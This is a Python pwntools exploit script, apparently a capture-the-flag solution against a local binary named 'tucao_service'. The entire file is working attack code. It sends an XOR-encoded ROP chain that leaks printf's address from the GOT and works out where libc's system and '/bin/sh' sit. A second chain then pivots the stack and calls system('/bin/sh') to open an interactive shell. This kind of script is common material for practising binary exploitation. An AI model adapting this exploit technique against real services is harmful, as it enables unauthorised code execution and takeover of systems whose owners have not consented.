from pwn import *
import time,sys,binascii

elf_name = "./tucao_service"
elf = ELF(elf_name)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

io = process( elf_name )
#gdb.attach(io, "b *0x0000000000400AD9")

def add(content):
    io.recvuntil('> ')
    io.sendline('1')
    io.recvuntil('Input your contents: ')
    io.sendline(content)

def delete(input_id):
    io.recvuntil('> ')
    io.sendline('2')
    io.recvuntil(': ')
    io.sendline(str(input_id))

def post(input_id, option):
    io.recvuntil('> ')
    io.sendline('3')
    io.recvuntil(': ')
    io.sendline(str(input_id))
    io.recvuntil('> ')
    io.sendline(str(option))

def quit():
    io.recvuntil('> ')
    io.sendline('4')

def main():
    gadget1 = 0x0000000000400fb3    #pop rdi ; ret
    gadget2 = 0x0000000000400fb3    #pop rdi ; ret
    gadget3 = 0x0000000000400fb1    #pop rsi ; pop r15 ; ret
    gadget4 = 0x00000000004007e0    #pop rbp ; ret
    gadget5 = 0x00000000004008bc    #leave ; ret
    read_to_buf = 0x0000000000400AA1
    stack_buf = 0x602300

    rop1 = 'a' * 0x21 + p64(gadget1) + p64(elf.got['printf']) + p64(elf.plt['printf'])
    rop1 += p64(gadget2) + p64(stack_buf) + p64(gadget3) + p64(0x100) + 'a' * 0x8 + p64(read_to_buf)
    rop1 += p64(gadget4) + p64(stack_buf) + p64(gadget5)
    print '[*]  rop1    :', rop1
    print '[*]  ', binascii.b2a_hex(rop1)

    rop1 = "".join(chr(ord(x)^0xff) for x in rop1)
    add(rop1)
    add('b' * 255)
    add('c' * 255)
    add('d' * 255)
    add('e' * 255)

    post(4, -11)
    post(1, 1)
    post(0, 0)

    #quit()

    io.recvuntil(':)\n')
    '''
    data = io.recv()
    print data

    '''
    printf_addr = u64(io.recv(8).ljust(8, '\x00'))
    print 'printf_addr :', printf_addr
    #io.recv()

    libc_base = printf_addr - libc.symbols['printf']
    system_addr = libc_base + libc.symbols['system']
    binsh_addr = libc_base + libc.search('/bin/sh').next()

    print 'libc_base :', libc_base
    print 'system_addr :', system_addr
    print 'binsh_addr :', binsh_addr


    rop2 = 'a' * 0x8 + p64(gadget1) + p64(binsh_addr) + p64(system_addr)
    io.sendline(rop2)


    io.interactive()

if __name__ == '__main__':
    main()
